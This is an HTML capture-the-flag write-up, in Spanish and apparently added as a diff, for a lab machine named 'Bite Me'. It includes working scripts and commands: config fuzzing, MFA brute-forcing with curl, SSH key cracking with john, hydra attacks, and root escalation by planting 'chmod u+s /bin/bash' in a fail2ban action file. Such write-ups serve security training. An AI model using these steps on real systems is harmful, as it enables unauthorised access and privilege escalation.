@@ -1,0 +1,733 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Bite Me - Flag Colector</title>
+    <link rel="stylesheet" href="../assets/writeup.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+</head>
+<body>
+    <div class="writeup-container">
+        <!-- Encabezado con metadatos -->
+        <div class="writeup-header">
+            <h1><i class="fas fa-skull"></i> Bite Me</h1>
+            <div class="machine-meta">
+                <span class="meta-item"><i class="fas fa-network-wired"></i> 10.10.31.72</span>
+                <span class="meta-item os linux"><i class="fab fa-linux"></i> Linux</span>
+                <span class="meta-item difficulty medium"><i class="fas fa-bolt"></i> Media</span>
+            </div>
+        </div>
+
+        <!-- Sección de Enumeración -->
+        <section class="writeup-section">
+            <h2><i class="fas fa-search"></i> Enumeración</h2>
+            
+            <div class="finding">
+                <h3>Nmap</h3>
+
+                <div class="command-box">
+                    <button class="copy-btn" onclick="copyToClipboard(this)"><i class="far fa-copy"></i></button>
+                    <code>sudo nmap -sV -Pn 10.10.31.72</code>
+                </div>
+
+                <div class="discovery-box-standard">
+                    <h4>Resultado:</h4>
+                    <p>PORT STATE SERVICE VERSION<br><br>
+                        22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.6 (Ubuntu Linux; protocol 2.0)<br><br>
+                        80/tcp open http Apache httpd 2.4.29 ((Ubuntu))<br><br>
+                        Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</p>
+                </div>
+
+                <div class="discovery-box">
+                    <h4>Características detectadas:</h4>
+                    <ul class="findings-list">
+                        <li>Puerto 22: Servidor OpenSSH (7.6p1)</li>
+                        <li>Puerto 80: Servidor Web Apache (2.4.29)</li>
+                    </ul>
+                </div>
+
+                <h3>Acceso al portal web (Puerto 80)</h3>
+
+                <!-- Imagen -->
+                <div class="image-box">
+                    <img src="../BiteMe/img/foto1.png" alt="foto" class="writeup-image">
+                    <p class="image-caption">Figura 1: Acceso al portal web (Puerto 80)</p>
+                </div>
+
+                <h3>Enumeración de directorios web</h3>
+
+                <div class="command-box">
+                    <button class="copy-btn" onclick="copyToClipboard(this)"><i class="far fa-copy"></i></button>
+                    <code>gobuster dir -u http://10.10.31.72 -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -t 30</code>
+                </div>
+
+                <!-- Imagen -->
+                <div class="image-box">
+                    <img src="../BiteMe/img/foto2.png" alt="foto" class="writeup-image">
+                    <p class="image-caption">Figura 2: Enumeación con Gobuster</p>
+                </div>
+
+                <div class="discovery-box-standard">
+                    <h4></h4>
+                    <p>Descubrimos un panel de login en /console</p>
+                </div>
+
+                <div class="command-box">
+                    <button class="copy-btn" onclick="copyToClipboard(this)"><i class="far fa-copy"></i></button>
+                    <code>http://10.10.31.72/console/securimage/</code>
+                </div>
+
+                <div class="discovery-box-standard">
+                    <p>Probamos de nuevo el descubrimiento de directorios sobre /console</p>
+                </div>
+
+                <div class="command-box">
+                    <button class="copy-btn" onclick="copyToClipboard(this)"><i class="far fa-copy"></i></button>
+                    <code>gobuster dir -u http://10.10.31.72/console -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -t 30</code>
+                </div>
+
+                <!-- Imagen -->
+                <div class="image-box">
+                    <img src="../BiteMe/img/foto3.png" alt="foto" class="writeup-image">
+                    <p class="image-caption">Figura 3: Enumeación con Gobuster sobre /console</p>
+                </div>
+
+                <div class="discovery-box-standard">
+                    <p>En securimage encontramos un directorio abierto con información sobre plugin del captcha que utiliza en PHP.</p>
+                </div>
+
+                <div class="command-box">
+                    <button class="copy-btn" onclick="copyToClipboard(this)"><i class="far fa-copy"></i></button>
+                    <code>http://10.10.31.72/console/securimage/</code>
+                </div>
+
+                <!-- Imagen -->
+                <div class="image-box">
+                    <img src="../BiteMe/img/foto4.png" alt="foto" class="writeup-image">
+                    <p class="image-caption">Figura 4: Acceso a http://10.10.31.72/console/securimage/</p>
+                </div>
+
+                <div class="discovery-box-standard">
+                    <p>Encontramos también un archivo words.txt en:</p>
+                </div>
+
+                <div class="command-box">
+                    <button class="copy-btn" onclick="copyToClipboard(this)"><i class="far fa-copy"></i></button>
+                    <code>http://10.10.31.72/console/securimage/words/words.txt</code>
+                </div>
+
+                <!-- Imagen -->
+                <div class="image-box">
+                    <img src="../BiteMe/img/foto5.png" alt="foto" class="writeup-image">
+                    <p class="image-caption">Figura 5: Archivo words.txt</p>
+                </div>
+
+                <h3>Fuzzing de configuraciones</h3>
+
+                <div class="discovery-box-standard">
+                    <p>Sabiendo que existen archivos PHP de configuración podemos intentar forzar para descubrir algunas configuraciones. Para ello usaremos un script:</p>
+                </div>
+
+                <div class="discovery-box">
+                    <h4>Script fuzzing_web.py</h4>
+                    <pre><code>
+                        #!/usr/bin/env python3
+                        import requests
+                        import sys
+
+                        def fuzz_configs(url):
+                            potential_configs = [
+                                "config.php", "config.phps", "config.bak",
+                                "db_config.php", "settings.php", "wp-config.php"
+                            ]
+                            print(f"Fuzzing en: {url}\n")
+                            for conf in potential_configs:
+                                full_url = f"{url.strip('/')}/{conf}"
+                                try:
+                                    r = requests.get(full_url, timeout=5)
+                                    if r.status_code not in [404, 400, 405]:
+                                        print(f"[{r.status_code}] {full_url}")
+                                except:
+                                    continue
+
+                        if __name__ == "__main__":
+                            fuzz_configs(sys.argv[1])
+                    </code></pre>
+                </div>
+
+                <div class="discovery-box-standard">
+                    <h4></h4>
+                    <p>Lo ejecutamos pasandole por parámetro la URL objetivo</p>
+                </div>
+
+                <div class="command-box">
+                    <button class="copy-btn" onclick="copyToClipboard(this)"><i class="far fa-copy"></i></button>
+                    <code>python3 fuzzing_web.py http://10.10.31.72/console</code>
+                </div>
+
+                <!-- Imagen -->
+                <div class="image-box">
+                    <img src="../BiteMe/img/foto6.png" alt="foto" class="writeup-image">
+                    <p class="image-caption">Figura 6: Resultados de fuzzing_web.py</p>
+                </div>
+
+                <div class="discovery-box-standard">
+                    <p>En config.phps encontramos un string en hexadecimal que al decodificarlo nos muestra un nombre de usuario:</p>
+                    <p>6a6173676e5f746573745f6163636f756e74 → jason_test_account</p>
+                </div>
+
+                <!-- Imagen -->
+                <div class="image-box">
+                    <img src="../BiteMe//img/foto7.png" alt="foto" class="writeup-image">
+                    <p class="image-caption">Figura 7: Acceso a config.phps</p>
+                </div>
+
+                <div class="discovery-box-standard">
+                    <p>En functions.phps encontramos cómo se valida la contraseña:</p>
+                    <p>La válida cuando el hash MD5 termine en '001'</p>
+                </div>
+
+                <!-- Imagen -->
+                <div class="image-box">
+                    <img src="../BiteMe/img/foto8.png" alt="foto" class="writeup-image">
+                    <p class="image-caption">Figura 8: Acceso a functions.phps</p>
+                </div>
+
+            </div>
+        </section>
+
+        <!-- Sección de Explotación -->
+        <section class="writeup-section">
+            <h2><i class="fas fa-bug"></i> Explotación</h2>
+            
+            <div class="exploit-step">
+                <h3>Encontrar contraseña válida</h3>
+
+                <div class="discovery-box-standard">
+                    <p>Sabiendo esto y teniendo la lista words.txt que encontramos antes podemos intentar ver cual
+                    de los hashes es el correcto.</p>
+                </div>
+
+                <div class="discovery-box warning">
+                    <h4><i class="fas fa-exclamation-triangle"></i>Debemos crear una wordlist.txt con las palabras de http://10.10.31.72/console/securimage/words/words.txt</h4>
+                </div>
+
+                <!-- Imagen -->
+                <div class="image-box">
+                    <img src="../BiteMe/img/foto9.png" alt="foto" class="writeup-image">
+                    <p class="image-caption">Figura 9: Creación de la word.txt</p>
+                </div>
+
+                <div class="discovery-box-standard">
+                    <p>Ahora crearemos un script hashes.sh para encontrar contraseñas cuyo hash MD5 termine en '001'</p>
+                </div>
+
+                <div class="discovery-box">
+                    <h4>Script hashes.sh</h4>
+                    <pre><code>
+                        #!/bin/bash
+
+                        wordlist="wordlist.txt"
+
+                        while IFS= read -r word; do
+                            hash=$(echo -n "$word" | md5sum | awk '{print $1}')
+                            if [[ $hash == *001 ]]; then
+                                echo "The password is: $word"
+                                break
+                            fi
+                        done < "$wordlist"
+                    </code></pre>
+                </div>
+
+                <div class="discovery-box-standard">
+                    <p>Lo ejecutamos: </p>
+                </div>
+
+                <div class="command-box">
+                    <button class="copy-btn" onclick="copyToClipboard(this)"><i class="far fa-copy"></i></button>
+                    <code>sudo chmod +x hashes.sh</code>
+                </div>
+
+                <div class="command-box">
+                    <button class="copy-btn" onclick="copyToClipboard(this)"><i class="far fa-copy"></i></button>
+                    <code>./hashes.sh</code>
+                </div>
+
+                <!-- Imagen -->
+                <div class="image-box">
+                    <img src="../BiteMe/img/foto10.png" alt="foto" class="writeup-image">
+                    <p class="image-caption">Figura 10: Resultados de hashes.sh</p>
+                </div>
+
+                <div class="discovery-box-standard">
+                    <p>La contraseña es: braggy<br><br>
+                        Ahora que tenemos usuario y contraseña podemos autenticarnos en http://10.10.31.72/console/</p>
+                </div>
+
+                <!-- Imagen -->
+                <div class="image-box">
+                    <img src="../BiteMe/img/foto11.png" alt="foto" class="writeup-image">
+                    <p class="image-caption">Figura 11: Acceso al login</p>
+                </div>
+
+
+                <h3>Bypass de autenticación MFA</h3>
+
+                <div class="discovery-box-standard">
+                    <p>Al acceder con las credenciales mencionadas anteriormente, veremos que tenemos un MFA activo.</p>
+                </div>
+
+                <!-- Imagen -->
+                <div class="image-box">
+                    <img src="../BiteMe/img/foto12.png" alt="foto" class="writeup-image">
+                    <p class="image-caption">Figura 12: MFA activo en el login</p>
+                </div>
+
+                <div class="discovery-box-standard">
+                    <p>Mirando el código fuente de la web podemos ver la función con la que se maneja el submit del MFA.</p>
+                </div>
+
+                <!-- Imagen -->
+                <div class="image-box">
+                    <img src="../BiteMe/img/foto13.png" alt="foto" class="writeup-image">
+                    <p class="image-caption">Figura 13: Inspeccionando el codigo del MFA</p>
+                </div>
+
+                <div class="discovery-box-standard">
+                    <p>Nos fijaremos en esta función:</p>
+                </div>
+
+                <!-- Imagen -->
+                <div class="image-box">
+                    <img src="../BiteMe/img/foto14.png" alt="foto" class="writeup-image">
+                    <p class="image-caption">Figura 14: Inspeccionando el codigo del MFA</p>
+                </div>
+
+                <div class="discovery-box-standard">
+                    <p>Más concretamente en este apartado:</p>
+                </div>
+
+                <!-- Imagen -->
+                <div class="image-box">
+                    <img src="../BiteMe/img/foto15.png" alt="foto" class="writeup-image">
+                    <p class="image-caption">Figura 15: Texto interesante dentro de la funxión del MFA</p>
+                </div>
+
+                <div class="discovery-box-standard">
+                    <p>Podremos ver un mensaje que dice ser necesario implementar mecanismos de seguridad para
+                        evitar el ataque de fuerza bruta, justo lo que vamos a aprovechar.</p>
+                </div>
+
+                <div class="discovery-box-standard">
+                    <p>Como nos indica el mensaje la clave es de 4 dígitos, por ello crearemos un diccionario de claves con crunch</p>
+                </div>
+
+                <div class="command-box">
+                    <button class="copy-btn" onclick="copyToClipboard(this)"><i class="far fa-copy"></i></button>
+                    <code>crunch 4 4 1234567890 > MFA.txt</code>
+                </div>
+
+                <!-- Imagen -->
+                <div class="image-box">
+                    <img src="../BiteMe/img/foto16.png" alt="foto" class="writeup-image">
+                    <p class="image-caption">Figura 16: Uso de crunch</p>
+                </div>
+
+                <div class="discovery-box-standard">
+                    <p>Capturamos con Burp Suite la petición de mandar el 2FA</p>
+                </div>
+
+                <!-- Imagen -->
+                <div class="image-box">
+                    <img src="../BiteMe/img/foto17.png" alt="foto" class="writeup-image">
+                    <p class="image-caption">Figura 17: Captura de la petición de login + MFA con Burp Suite</p>
+                </div>
+
+                <div class="discovery-box-standard">
+                    <h4></h4>
+                    <p>Ahora para hacer el brute forcing con Burp Suite va a tardar demasiado así que usaremos el siguiente script:</p>
+                </div>
+
+                <div class="discovery-box">
+                    <h4>Script hashes.sh</h4>
+                    <pre><code>
+                        #!/bin/bash
+
+                        TARGET="http://10.10.31.72/console/mfa.php"
+                        COOKIE="PHPSESSID=38foerd2ev0ekkvib75uv13484; user=jason_test_account; pwd=braggy"
+                        WORDLIST="MFA.txt"
+                        THREADS=25 # Puedes subirlo si el servidor aguanta
+
+                        echo "[+] Bruteforce iniciado... solo se mostrará el código correcto."
+
+                        cat "$WORDLIST" | xargs -P "$THREADS" -I {} bash -c '
+                            CODE={}
+                            RESPONSE=$(curl -s -X POST "'"$TARGET"'" \
+                                -d "code=$CODE" \
+                                -H "Content-Type: application/x-www-form-urlencoded" \
+                                -H "Cookie: '"$COOKIE"'" \
+                                -H "Referer: '"$TARGET"'" \
+                                -H "User-Agent: Mozilla/5.0")
+                                
+                            if ! echo "$RESPONSE" | grep -q "Incorrect code"; then
+                                echo "[✔] Código correcto encontrado: $CODE"
+                                pkill -P $$ curl 2>/dev/null
+                                kill $$ 2>/dev/null
+                            fi
+                        '
+
+                    </code></pre>
+                </div>
+
+                <div class="discovery-box-standard">
+                    <h4></h4>
+                    <p>Ahora lo ejecutamos:</p>
+                </div>
+
+                <div class="command-box">
+                    <button class="copy-btn" onclick="copyToClipboard(this)"><i class="far fa-copy"></i></button>
+                    <code>sudo chmod +x bruteforce.sh</code>
+                </div>
+
+                <div class="command-box">
+                    <button class="copy-btn" onclick="copyToClipboard(this)"><i class="far fa-copy"></i></button>
+                    <code>./bruteforce.sh</code>
+                </div>
+
+                <!-- Imagen -->
+                <div class="image-box">
+                    <img src="../BiteMe/img/foto18.png" alt="foto" class="writeup-image">
+                    <p class="image-caption">Figura 18: Resultados de hashes.sh</p>
+                </div>
+
+                <div class="discovery-box-standard">
+                    <h4></h4>
+                    <p>Con este código podremos acceder al panel</p>
+                </div>
+
+
+                <h3>Acceso al panel</h3>
+
+                <div class="discovery-box-standard">
+                    <p>Con las credenciales jason_test_account:braggy y el código MFA 2573 accedemos al panel.</p>
+                </div>
+
+                <!-- Imagen -->
+                <div class="image-box">
+                    <img src="../BiteMe/img/foto19.png" alt="foto" class="writeup-image">
+                    <p class="image-caption">Figura 19: Acceso al ligin con credenciales y MFA válido</p>
+                </div>
+
+                <div class="discovery-box-standard">
+                    <p>Veremos un panel para buscar y visualizar archivos</p>
+                </div>
+
+                <!-- Imagen -->
+                <div class="image-box">
+                    <img src="../BiteMe/img/foto20.png" alt="foto" class="writeup-image">
+                    <p class="image-caption">Figura 20: Acceso a la web</p>
+                </div>
+
+                <h3>File viewer</h3>
+
+                <div class="discovery-box-standard">
+                    <p>Podemos ver archivos del sistema como /etc/passwd</p>
+                </div>
+
+                <!-- Imagen -->
+                <div class="image-box">
+                    <img src="../BiteMe/img/foto21.png" alt="foto" class="writeup-image">
+                    <p class="image-caption">Figura 21: Visualizar el /etc/passwd</p>
+                </div>
+
+                <div class="discovery-box-standard">
+                    <p>Si probamos por ejemplo a hacer un dir podremos ver que utiliza la función scandir para listar los archivos y directorios</p>
+                </div>
+
+                <!-- Imagen -->
+                <div class="image-box">
+                    <img src="../BiteMe/img/foto22.png" alt="foto" class="writeup-image">
+                    <p class="image-caption">Figura 22: Uso de la función scandir</p>
+                </div>
+
+                <h3>User Flag</h3>
+
+                <div class="discovery-box-standard">
+                    <p>Desde aquí ya podemos ver la flag de usuario</p>
+                </div>
+
+                <div class="command-box">
+                    <button class="copy-btn" onclick="copyToClipboard(this)"><i class="far fa-copy"></i></button>
+                    <code>/home/jason</code>
+                </div>
+
+                <!-- Imagen -->
+                <div class="image-box">
+                    <img src="../BiteMe/img/foto23.png" alt="foto" class="writeup-image">
+                    <p class="image-caption">Figura 23: Listar ficheros</p>
+                </div>
+
+                <div class="command-box">
+                    <button class="copy-btn" onclick="copyToClipboard(this)"><i class="far fa-copy"></i></button>
+                    <code>/home/jason/user.txt</code>
+                </div>
+
+                <!-- Imagen -->
+                <div class="image-box">
+                    <img src="../BiteMe/img/foto24.png" alt="foto" class="writeup-image">
+                    <p class="image-caption">Figura 24: User Flag</p>
+                </div>
+
+                <h3>Acceso SSH</h3>
+
+                <div class="discovery-box-standard">
+                    <p>Buscamos claves ssh en el sistema. <br><br> la clave SSH en /home/jason/.ssh/id_rsa</p>
+                </div>
+
+                <div class="command-box">
+                    <button class="copy-btn" onclick="copyToClipboard(this)"><i class="far fa-copy"></i></button>
+                    <code>/home/jason/.ssh/id_rsa</code>
+                </div>
+
+                <!-- Imagen -->
+                <div class="image-box">
+                    <img src="../BiteMe/img/foto25.png" alt="foto" class="writeup-image">
+                    <p class="image-caption">Figura 25: Clave RSA para acceso SSH</p>
+                </div>
+
+                <div class="discovery-box warning">
+                    <h4><i class="fas fa-exclamation-triangle"></i>Pegamos esta clave en un archivo y como se encuentra encriptada utilizamos el siguiente
+                    comando para descifrarla</h4>
+                </div>
+
+                <!-- Imagen -->
+                <div class="image-box">
+                    <img src="../BiteMe/img/foto26.png" alt="foto" class="writeup-image">
+                    <p class="image-caption">Figura 26: Clave RSA</p>
+                </div>
+
+                <div class="command-box">
+                    <button class="copy-btn" onclick="copyToClipboard(this)"><i class="far fa-copy"></i></button>
+                    <code>ssh2john claveRSA > jasonkey</code>
+                </div>
+                <div class="command-box">
+                    <button class="copy-btn" onclick="copyToClipboard(this)"><i class="far fa-copy"></i></button>
+                    <code>john jasonkey --wordlist=/usr/share/wordlists/rockyou.txt</code>
+                </div>
+
+                <!-- Imagen -->
+                <div class="image-box">
+                    <img src="../BiteMe/img/foto27.png" alt="foto" class="writeup-image">
+                    <p class="image-caption">Figura 27: Descifrado de la clave RSA</p>
+                </div>
+
+                <div class="discovery-box-standard">
+                    <p>Ahora damos permisos al archivo y tendremos acceso al sistema por SSH.</p>
+                </div>
+
+                <div class="command-box">
+                    <button class="copy-btn" onclick="copyToClipboard(this)"><i class="far fa-copy"></i></button>
+                    <code>sudo chmod +x claveRSA</code>
+                </div>
+
+                <div class="command-box">
+                    <button class="copy-btn" onclick="copyToClipboard(this)"><i class="far fa-copy"></i></button>
+                    <code>ssh -i claveRSA jason@10.10.31.72</code>
+                </div>
+
+                <!-- Imagen -->
+                <div class="image-box">
+                    <img src="../BiteMe/img/foto28.png" alt="foto" class="writeup-image">
+                    <p class="image-caption">Figura 28: Acceso por SSH</p>
+                </div>
+            </div>
+        </section>
+
+        <!-- Sección de Escalada de Privilegios -->
+        <section class="writeup-section">
+            <h2><i class="fas fa-user-shield"></i> Escalada de Privilegios</h2>
+
+            <div class="command-box">
+                <button class="copy-btn" onclick="copyToClipboard(this)"><i class="far fa-copy"></i></button>
+                <code>sudo -l</code>
+            </div>
+
+            <!-- Imagen -->
+            <div class="image-box">
+                <img src="../BiteMe/img/foto29.png" alt="foto" class="writeup-image">
+                <p class="image-caption">Figura 29: Visualización de permisos</p>
+            </div>
+
+            <div class="discovery-box-standard">
+                <h4>Como vemos en el comando sudo -l el usuario:</h4>
+                <p>
+                    (ALL : ALL) ALL Puedes ejecutar cualquier comando como root, si sabemos la contraseña
+                    de jason.<br><br>
+                    (fred) NOPASSWD: ALL Puedes ejecutar cualquier comando como el usuario fred sin
+                    contraseña.</p>
+            </div>
+
+            <div class="discovery-box-standard">
+                <h4></h4>
+                <p>Por lo tanto vamos a pasar al usuario fred.</p>
+            </div>
+
+            <div class="command-box">
+                <button class="copy-btn" onclick="copyToClipboard(this)"><i class="far fa-copy"></i></button>
+                <code>sudo -s -u fred</code>
+            </div>
+
+            <!-- Imagen -->
+            <div class="image-box">
+                <img src="../BiteMe/img/foto30.png" alt="foto" class="writeup-image">
+                <p class="image-caption">Figura 30: Cambio al usuario fred</p>
+            </div>
+
+            <div class="discovery-box-standard">
+                <h4></h4>
+                <p>Ahora veremos los privilegios que cuanta el usuario fred</p>
+            </div>
+
+            <div class="command-box">
+                <button class="copy-btn" onclick="copyToClipboard(this)"><i class="far fa-copy"></i></button>
+                <code>sudo -l</code>
+            </div>
+
+            <!-- Imagen -->
+            <div class="image-box">
+                <img src="../BiteMe/img/foto31.png" alt="foto" class="writeup-image">
+                <p class="image-caption">Figura 31: Permisos del usuario fred</p>
+            </div>
+
+            <div class="discovery-box-standard">
+                <h4></h4>
+                <p>Podemos reiniciar el servicio fail2ban como root sin contraseña. <hr><br>
+                    "Fail to ban client" es un servicio que protege servidores bloqueando automáticamente
+                    direcciones IP que muestran actividad sospechosa<hr><br>
+                    Si podemos editar archivos de configuración de fail2ban, podemos insertar comandos
+                    maliciosos. Como fail2ban ejecuta esas acciones como root, al activarse (por ejemplo con
+                    varios intentos fallidos de login), se ejecutaría nuestro comando con privilegios de administrador.
+                    </p>
+            </div>
+
+            <h3>Explotando fail2ban</h3>
+
+            <div class="discovery-box-standard">
+                <h4></h4>
+                <p>Verificamos permisos sobre /etc/fail2ban/action.d</p>
+            </div>
+
+            <div class="command-box">
+                <button class="copy-btn" onclick="copyToClipboard(this)"><i class="far fa-copy"></i></button>
+                <code>find /etc -writable -ls 2>/dev/null</code>
+            </div>
+
+            <div class="discovery-box-standard">
+                <p>Confirmaremos que tenemos permisos de escritura en:<br>
+                    /etc/fail2ban/action.d/iptables-multiport.conf</p>
+            </div>
+
+            <!-- Imagen -->
+            <div class="image-box">
+                <img src="../BiteMe/img/foto32.png" alt="foto" class="writeup-image">
+                <p class="image-caption">Figura 32: Permisos de escritura en el fichero iptables-multiport.conf</p>
+            </div>
+
+            <div class="discovery-box-standard">
+                <p>Editaremos dicho archivo</p>
+            </div>
+
+            <div class="command-box">
+                <button class="copy-btn" onclick="copyToClipboard(this)"><i class="far fa-copy"></i></button>
+                <code>nano /etc/fail2ban/action.d/iptables-multiport.conf</code>
+            </div>
+
+            <div class="discovery-box-standard">
+                <p>Añadimos la siguiente línea al final del archivo:</p>
+            </div>
+
+            <div class="command-box">
+                <button class="copy-btn" onclick="copyToClipboard(this)"><i class="far fa-copy"></i></button>
+                <code>actionban = chmod u+s /bin/bash</code>
+            </div>
+
+            <!-- Imagen -->
+            <div class="image-box">
+                <img src="../BiteMe/img/foto33.png" alt="foto" class="writeup-image">
+                <p class="image-caption">Figura 33: Edición del fichero iptables-multiport.conf</p>
+            </div>
+
+            <div class="discovery-box-standard">
+                <p>Reiniciamos el servicio fail2ban</p>
+            </div>
+
+            <div class="command-box">
+                <button class="copy-btn" onclick="copyToClipboard(this)"><i class="far fa-copy"></i></button>
+                <code>sudo systemctl restart fail2ban</code>
+            </div>
+
+            <div class="discovery-box-standard">
+                <p>Realizamos un ataque de fuerza bruta: <br><br> (Atacaremos por fuerza bruta el SSH (10.10.31.72) probando contraseñas de rockyou.txt para el
+                usuario root)</p>
+            </div>
+
+            <div class="command-box">
+                <button class="copy-btn" onclick="copyToClipboard(this)"><i class="far fa-copy"></i></button>
+                <code>hydra -l root -P /usr/share/wordlists/rockyou.txt 10.10.31.72 ssh</code>
+            </div>
+
+            <!-- Imagen -->
+            <div class="image-box">
+                <img src="../BiteMe/img/foto34.png" alt="foto" class="writeup-image">
+                <p class="image-caption">Figura 34: Ataque con Hydra</p>
+            </div>
+
+            <div class="discovery-box-standard">
+                <p>Verificamos que /bin/bash tiene SUID:</p>
+            </div>
+
+            <div class="command-box">
+                <button class="copy-btn" onclick="copyToClipboard(this)"><i class="far fa-copy"></i></button>
+                <code>ls -l /bin/bash</code>
+            </div>
+
+            <!-- Imagen -->
+            <div class="image-box">
+                <img src="../BiteMe/img/foto35.png" alt="foto" class="writeup-image">
+                <p class="image-caption">Figura 35: Cambio del SUID</p>
+            </div>
+
+            <div class="discovery-box warning">
+                <h4><i class="fas fa-exclamation-triangle"></i>La "s" en los permisos indica que el archivo tiene el bit SUID (Set User ID) activado. por lo
+                    tanto ha funcionado</h4>
+            </div>
+
+            <h3>Root Flag</h3>
+
+            <div class="discovery-box-standard">
+                <p>Tenemos un bash con el SUID bit activado y propiedad de root. Esto puede permitirte abrir una shell como root:</p>
+            </div>
+
+            <div class="command-box">
+                <button class="copy-btn" onclick="copyToClipboard(this)"><i class="far fa-copy"></i></button>
+                <code>/bin/bash -p</code>
+            </div>
+
+            <div class="command-box">
+                <button class="copy-btn" onclick="copyToClipboard(this)"><i class="far fa-copy"></i></button>
+                <code>cat /root/root.txt</code>
+            </div>
+
+            <!-- Imagen -->
+            <div class="image-box">
+                <img src="../BiteMe/img/foto36.png" alt="foto" class="writeup-image">
+                <p class="image-caption">Figura 36: Root Flag</p>
+            </div>
+
+        </section>
+    </div>
+
+    <script src="../assets/scripts/copy.js" defer></script>
+</body>
+</html>
